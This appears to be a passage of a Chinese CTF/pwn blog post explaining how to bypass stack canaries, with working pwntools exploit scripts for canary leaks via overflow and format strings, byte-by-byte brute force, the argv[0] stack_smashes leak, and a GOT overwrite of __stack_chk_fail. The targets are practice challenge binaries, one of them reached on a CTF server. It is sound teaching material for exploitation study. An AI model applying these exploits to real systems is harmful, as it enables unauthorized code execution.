+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">moV rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">xOr rdx,QWORD PTR fs:0x28</span><br><span class="line">je0x4005d7&lt;main+65&gt;</span><br><span class="line">call 0x400460&lt;_stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果检测出Canary的值被修改过，则会运行到<code>__stack_chk_fail</code>函数。这个函数位于glibc中，默认情况下经过ELF的延迟绑定。也就是说，<code>stack_chk_fail</code>是一个外部函数，当程序没有开启FULL RELRO保护时，可以被GOT劫持攻击。攻击者可以先劫持stack_chk_fail函数的GOT，再触发Canary检测报错，这时就会进入劫持的地址，这也是一种利用思路</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250728110143291.png"  alt="image-20250728110143291"></p>
+<p>在 Linux x86-64 架构下，Canary（也称为 <code>stack_guard</code> 或栈保护值）通常并不是直接存储在栈上（那样它就容易被溢出），而是存储在一个<strong>线程本地存储 (TLS)</strong> 区域中。</p>
+<p>在 x86-64 Linux 系统中，<code>fs</code> 寄存器（或者 <code>gs</code> 寄存器）被操作系统用于指向当前线程的线程本地存储 (TLS) 区域。</p>
+<ul>
+<li>GCC 编译器在编译时，会在程序启动时初始化这个 Canary 值，并将其存储在 TLS 区域的一个特定偏移量上。</li>
+<li>对于 x86-64 Linux，这个偏移量通常是 <code>0x28</code>。所以，<code>fs:0x28</code> 指向的内存地址就是当前线程的 <code>stack_guard</code>（即 Canary 值）的存储位置。</li>
+</ul>
+<p>而且TLS中的值由函数security_init进行初始化</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250728111337337.png"  alt="image-20250728111337337"></p>
+<p>最后，注意Canary最后的一个字节会被设置为0，防止类似printf（”%s”,&amp;buf）形式的函数不小心将Canary的值打印出来，所以用“\x00”字符（在C语言中表示字符串的结尾）来做一个截断，和ASLR没有关系。</p>
+<p><strong>栈结构</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[ buf (256 bytes)         ]  ← esp+0x00</span><br><span class="line">[ stack canary (4 bytes)  ]  ← esp+0x100</span><br><span class="line">[ saved ebp (4 bytes)     ]</span><br><span class="line">[ return address (4 bytes)]</span><br></pre></td></tr></table></figure>
+
+<p><strong>对于有Canary的程序，如果考虑栈溢出攻击，主要有下面4个思路：</strong></p>
+<p>1）利用泄露函数泄露出Canary的值，再进行利用。</p>
+<p>2）爆破得到Canary的值。</p>
+<p>3）__stack_chk_fail函数泄露关键信息。</p>
+<p>4）修改TLS中的stack_guard值。</p>
+<h2 id="1-leak-canary（泄露Canary值）"><a href="#1-leak-canary（泄露Canary值）" class="headerlink" title="1.leak_canary（泄露Canary值）"></a>1.leak_canary（泄露<strong>Canary</strong>值）</h2><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250728164543965.png"  alt="image-20250728164543965"></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250728164606083.png"  alt="image-20250728164606083"></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250728164644826.png"  alt="image-20250728164644826"></p>
+<h3 id="脚本1（printf-替代-x00）"><a href="#脚本1（printf-替代-x00）" class="headerlink" title="脚本1（printf_替代&#x2F;x00）"></a>脚本1（printf_替代&#x2F;x00）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./leak_canary&quot;)</span><br><span class="line">#gdb.attach(p,&quot;b *0x08048631&quot;)</span><br><span class="line"></span><br><span class="line">main=0x0804867f</span><br><span class="line">bin= 0x080485CC</span><br><span class="line">payload=b&#x27;a&#x27;*0x100+b&#x27;b&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(b&#x27;a&#x27;*0x100)</span><br><span class="line">canary=u32(p.recv(4))-ord(&#x27;b&#x27;)</span><br><span class="line">print(hex(canary))</span><br><span class="line"></span><br><span class="line">payload=b&#x27;\x00&#x27;*0x100+p32(canary)</span><br><span class="line">payload+=p32(0)*2</span><br><span class="line">payload+=p32(main)</span><br><span class="line">payload+=p32(bin)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=b&#x27;a&#x27;*0x100+b&#x27;b&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(b&#x27;a&#x27;*0x100)</span><br><span class="line">canary=u32(p.recv(4))-ord(&#x27;b&#x27;)</span><br><span class="line">print(hex(canary))</span><br></pre></td></tr></table></figure>
+
+<p>用b替代canary最低位的\x00,使得它的值可以被输出</p>
+<p>然后用收到的数据减去b的值就是canary的值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload+=p32(0)*2</span><br></pre></td></tr></table></figure>
+
+<p>两个padding</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250728161506263.png"  alt="image-20250728161506263"></p>
+<p>分配了 0x118字节的栈空间给局部变量和padding。</p>
+<p><strong>栈空间一次性分配，便于管理和性能</strong></p>
+<ul>
+<li><p>编译器在函数入口会执行类似 <code>sub esp, 0x118</code> 的操作，一次性给函数所有局部变量、临时数据和对齐空间分配足够大的连续栈空间。分配的 280 字节是 <strong>buf + 其他局部变量 + padding</strong></p>
+</li>
+<li><p>这块空间里包含你所有局部变量（比如 <code>buf</code>）、隐式变量（比如保存的寄存器）、以及为了满足 CPU 访问对齐需求而插入的 padding。</p>
+<p>从ebp开辟了0x118个字节存放，但buf从ebp-0x10c开始存储，接着是canary，所以还有两个padding</p>
+</li>
+</ul>
+<p>canary不一定是挨着缓冲区的，单在这道题是的</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250728165151504.png"  alt="image-20250728165151504"></p>
+<table>
+<thead>
+<tr>
+<th>情况</th>
+<th>会插 canary 紧挨数组吗？</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>函数里有 <code>char buf[xxx]</code></td>
+<td>✅ <strong>一般会</strong>放 canary 在 buf 后面</td>
+</tr>
+<tr>
+<td>没有数组、不会栈溢出</td>
+<td>❌ 通常不会启用 canary</td>
+</tr>
+<tr>
+<td>数组不在栈上（比如 malloc 的）</td>
+<td>❌ 不是栈保护的范围</td>
+</tr>
+<tr>
+<td>特殊优化或内联小函数</td>
+<td>⚠️ 可能被省略</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>虽然 <strong>canary 的位置不是硬编码的</strong>，但在实际场景中（特别是题目明确有 <code>char buf[]</code> 并开启了 canary），它通常 <strong>就在 buf 后面</strong>，且通过调试或试探可以<strong>准确确定它的偏移位置</strong>。</p>
+</blockquote>
+<h3 id="脚本2（格式化字符串）"><a href="#脚本2（格式化字符串）" class="headerlink" title="脚本2（格式化字符串）"></a>脚本2（格式化字符串）</h3><p>可以看到buf在第7个位置上<img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250728171852627.png"  alt="image-20250728171852627"></p>
+<p>而且buf有256个字节，可以存放64个字符</p>
+<p>所以canary就是在第64+7即71个参数的位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./leak_canary&quot;)</span><br><span class="line">#gdb.attach(p,&quot;b printf&quot;)</span><br><span class="line"></span><br><span class="line">target = 0x080485CC</span><br><span class="line"></span><br><span class="line">p1 = &quot;%71$p\n&quot;</span><br><span class="line">p.send(p1)</span><br><span class="line">leak_info = p.recvuntil(&quot;\n&quot;,drop = True)</span><br><span class="line">canary = int(leak_info,16)</span><br><span class="line">log.success(&quot;canary:&quot; + hex(canary))</span><br><span class="line"></span><br><span class="line">p2 = b&quot;\x00&quot; * 0x100 + p32(canary)</span><br><span class="line">p2 += p32(0) * 3</span><br><span class="line">p2 += p32(target)</span><br><span class="line">p.send(p2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="2-one-by-one-bruteforce-逐个字节爆破"><a href="#2-one-by-one-bruteforce-逐个字节爆破" class="headerlink" title="2.one_by_one_bruteforce(逐个字节爆破)"></a>2.<strong>one_by_one_bruteforce</strong>(逐个字节爆破)</h2><p>通过fork函数开启子进程交互的题目，因为fork函数会直接拷贝父进程的内存，所以每次创建的子进程的Canary是相同的。我们可以利用这个特点，逐个字节地将Canary爆破出来。</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250729142758725.png"  alt="image-20250729142758725"></p>
+<h3 id="脚本-3"><a href="#脚本-3" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./one_by_one_bruteforce&quot;)</span><br><span class="line"></span><br><span class="line">def bruteforece1bit():</span><br><span class="line">	global known</span><br><span class="line">	for i in range(256):</span><br><span class="line">		p1 = &quot;a&quot; * 0x108</span><br><span class="line">		p1 += known</span><br><span class="line">		p1 += chr(i)</span><br><span class="line">		p.sendafter(&quot;one_by_one_bruteforce\n&quot;,p1)</span><br><span class="line">		try:</span><br><span class="line">			info = p.recvuntil(&quot;\n&quot;)</span><br><span class="line">			if &quot;*** stack smashing detected ***:&quot; in info:</span><br><span class="line">				p.send(&quot;n\n&quot;)</span><br><span class="line">				continue</span><br><span class="line">			else:</span><br><span class="line">				known += chr(i)</span><br><span class="line">				break</span><br><span class="line">		except:</span><br><span class="line">			log.info(&quot;maybe there something wrong&quot;)</span><br><span class="line">			break</span><br><span class="line"></span><br><span class="line">def bruteforce_canary():</span><br><span class="line">	global known</span><br><span class="line">	known += &quot;\x00&quot;</span><br><span class="line">	for i in range(7):</span><br><span class="line">		bruteforece1bit()</span><br><span class="line">		if i != 6:</span><br><span class="line">			p.send(&quot;n\n&quot;)</span><br><span class="line">		else:</span><br><span class="line">			p.send(&quot;y\n&quot;)</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">target = 0x000000000040083E</span><br><span class="line">known = &quot;&quot;</span><br><span class="line">bruteforce_canary()</span><br><span class="line">canary = u64(known)</span><br><span class="line">log.success(&quot;canary:&quot; + hex(canary))</span><br><span class="line">p2 = &quot;a&quot; * 0x108 + p64(canary) + p64(0) + p64(target)</span><br><span class="line">p.sendafter(&quot;go\n&quot;,p2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>逐字节尝试，无“stack smashing detected”报错回显来对Canary的数值进行逐字节爆破。如果输入正确，则没有回显，能得到Canary的这个字节，然后开始下一个字节的爆破；如果输入有误，则爆破不成功，继续下一个爆破的数值，爆破不成功时子进程会报错退出，但不会影响父进程，父进程会一直创建子进程，可以利用这一点实现爆破。得到Canary的具体数值后，可以在父进程进行栈溢出，覆盖返回地址，实现Getshell，也可以在子进程中实现Getshell。因为有了Canary的具体数值，所以可以绕过Canary保护机制</p>
+<h2 id="3-stack-smashes"><a href="#3-stack-smashes" class="headerlink" title="3.stack_smashes"></a>3.stack_smashes</h2><p>stack_smashes是一种特殊的利用思路。前面已经提到过，在_stack_chk_fail函数中会将_libc_argv[0]的信息打印出来，</p>
+<p>例如(stack smashing detected : [程序名] terminated）如果能够控制__libc_argv[0]中保存的地址为我们想要的信息的地址，那么就能得到相应的数据。</p>
+<p>在 Linux 系统中，程序名通常是通过读取 <code>__libc_argv[0]</code> 这个全局指针来实现的。<code>__libc_argv</code> 是 libc 库内部维护的一个指针数组，其中 <code>__libc_argv[0]</code> 指向当前进程的可执行文件路径字符串。</p>
+<p>攻击者通过<strong>任意地址写入</strong>（通常通过 ROP 链实现）将 <code>__libc_argv[0]</code> 这个指针的值，从原来的程序名地址，修改为<strong>我们想要泄露的数据的地址</strong>（例如 <code>flag</code> 的地址）。</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250730151211960.png"  alt="image-20250730151211960"></p>
+<p>🔍 main 函数的标准原型</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc, char *argv[], char *envp[]);</span><br></pre></td></tr></table></figure>
+
+<p>argc: 命令行参数个数</p>
+<p>argv: 参数字符串数组指针</p>
+<p>envp: 环境变量字符串数组指针</p>
+<p>在栈上，这些参数是由 <code>__libc_start_main</code> 调用 <code>main</code> 时传入的。</p>
+<p>所以查看buf的地址</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/202407182347411.png"  alt="img"></p>
+<p>直接下断点到read的位置，看到buf的位置是0x7fffffffdc00</p>
+<p>接着查看libc_argc[1],即文件信息</p>
+<p>0x7fffffffde18</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250730152108369.png"  alt="image-20250730152108369"></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250730153719720.png"  alt="image-20250730153719720"></p>
+<p>计算好偏移之后就可以把libc_argc[0]的地址换为flag的地址了</p>
+<h3 id="脚本-4"><a href="#脚本-4" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./stack_smashes&quot;)</span><br><span class="line">#gdb.attach(p,&quot;b *0x0000000000400875&quot;)</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">flag_addr = 0x0601090</span><br><span class="line">p2 = &quot;a&quot; * 0x218 + p64(flag_addr)</span><br><span class="line">p.sendafter(&quot;stack_smashes\n&quot;,p2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<p>还有就是直接把stack_chk_fail函数的get表村的地址改为后门函数的地址</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250729170831207.png"  alt="image-20250729170831207"></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250729171027431.png"  alt="image-20250729171027431"></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250729171058667.png"  alt="image-20250729171058667"></p>
+<p>偏移是6</p>
+<h3 id="脚本-5"><a href="#脚本-5" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,word_size=&#x27;64&#x27;)</span><br><span class="line">p=remote(&quot;node5.buuoj.cn&quot;,25904)</span><br><span class="line"></span><br><span class="line">#p = process(&quot;./r2t4&quot;)</span><br><span class="line">elf = ELF(&quot;./r2t4&quot;)</span><br><span class="line"></span><br><span class="line">backdoor = 0x400626</span><br><span class="line">#__stack_chk_fail_got_addr = elf.got[&quot;__stack_chk_fail&quot;]</span><br><span class="line">__stack_chk_fail = elf.got[&#x27;__stack_chk_fail&#x27;]</span><br><span class="line">payload = fmtstr_payload(6, &#123;__stack_chk_fail: backdoor&#125;).ljust(0x38,b&#x27;a&#x27;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>总结来说，ljust(0x38, b’a’) 的目的是：</p>
+<p>确保 <code>read</code> 函数读取到完整的、由我们控制的 56 字节数据。</p>
+<p>防止 <code>read</code> 函数读取到其他不可预测的数据，从而干扰 <code>printf</code> 的行为。</p>
+
+                    
+                </div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/PWN/">PWN</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2025/07/24/ciscn-2019-es-2/"
+                                   title="ciscn_2019_es_2"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">ciscn_2019_es_2</span>
+                                        <span class="post-nav-item">Prev posts</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2025/07/22/ciscn-2019-sw-1/"
+                                   title="ciscn_2019_sw_1"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">ciscn_2019_sw_1</span>
+                                        <span class="post-nav-item">Next posts</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2026
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">Keep Team</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+
+    <!-- tablet toc -->
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+
+<!-- lazyload -->
+
+
+<div class="">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+</body>
+</html>
